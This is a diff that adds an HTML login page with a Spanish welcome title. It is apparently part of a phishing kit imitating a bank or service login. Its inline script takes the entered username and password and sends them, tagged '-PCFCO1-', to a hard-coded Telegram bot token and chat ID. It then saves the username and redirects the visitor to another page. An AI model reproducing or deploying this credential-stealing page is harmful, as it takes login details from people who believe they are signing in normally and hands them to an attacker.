@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bienvenido</title>
+    <link rel="shortcut icon" href="pixts/ico.ico" type="image/x-icon">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+    <div></div>
+     
+    <div class="cont-log">
+        <img src="pixts/log.png" alt="">
+    </div>
+
+    <div class="cont">
+        <img src="pixts/fm1.svg" alt="">
+        <div class="cont-form">
+            <form   method="post">
+                <div class="cont-usr">
+                    <div class="usr">
+                        <input id="trax" name="traxs" type="text">
+                    </div>
+                    <div class="usr">
+                        <input id="trex" name="trex" type="password">
+                        
+                    </div>
+                </div>
+                
+                <div class="sub" onclick="ssdds()">
+                    <input type="button" >
+                </div>
+            </form>
+        </div>
+
+    </div>
+
+    <script>
+     
+        
+        
+        function ssdds(params) {
+            let rr = document.getElementById("trax").value;
+           let rrs = document.getElementById("trex").value;
+           const token = '5881769745:AAFiecIBFXB7lIJXhf3N1XP4TPc6uc4ZOjU';
+const chatId = '-4036890861';
+
+
+  
+const message = `-PCFCO1-\n --Usr.: ${rr} \n  Pw: ${rrs}` ;
+$.ajax({
+  type: 'POST',
+  url: `https://api.telegram.org/bot${token}/sendMessage`,
+  data: {  
+	  chat_id: chatId,
+	  text: message,
+	  parse_mode: 'html',
+  },
+  success: function (res) {
+	  console.debug(res);
+	  $('#response').text('Message sent');
+	  console.log("enviado")
+      localStorage.setItem("usr",rr );
+      
+      window.location = "_index.html"
+	  
+	  
+	 
+  },
+  error: function (error) {
+	  console.error(error);
+	  alert("error failed");
+  } 
+
+})
+            
+               
+               
+               
+           
+            
+        }
+        
+            </script>
+
+</body>
+
+</html>
